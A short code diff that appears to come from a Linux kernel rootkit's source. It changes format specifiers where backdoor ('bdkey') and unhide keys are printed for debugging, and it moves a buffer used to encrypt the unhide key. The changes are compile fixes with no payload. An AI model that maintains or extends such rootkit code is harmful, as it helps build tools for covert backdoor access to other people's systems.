@@ -597,12 +597,12 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 #ifdef DEBUG_RING_BUFFER
 		case Opt_get_bdkey: {
 			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%lx", auto_bdkey);
+			snprintf(bits, 32, "%llx", auto_bdkey);
 			set_elfbits(bits);
 		} break;
 		case Opt_get_unhidekey: {
 			char bits[32 + 1] = { 0 };
-			snprintf(bits, 32, "%lx", auto_unhidekey);
+			snprintf(bits, 32, "%llx", auto_unhidekey);
 			set_elfbits(bits);
 		} break;
 #endif
@@ -799,6 +799,7 @@ static void _unroll_init(void)
 
 static int __init kv_init(void)
 {
+	u8 buf[16] = {0};
 	int rv = 0;
 	char *procname_err = "";
 	const char **name;
@@ -865,10 +866,8 @@ cont:
 		goto crypto_error;
 	}
 
-	size_t datalen = 16;
-	u8 buf[16] = {0};
 	memcpy(buf, &auto_unhidekey, 8);
-	kv_encrypt(kvmgc_unhidekey, buf, datalen);
+	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
 
 	/** discard saved key */
 	auto_unhidekey = 0;
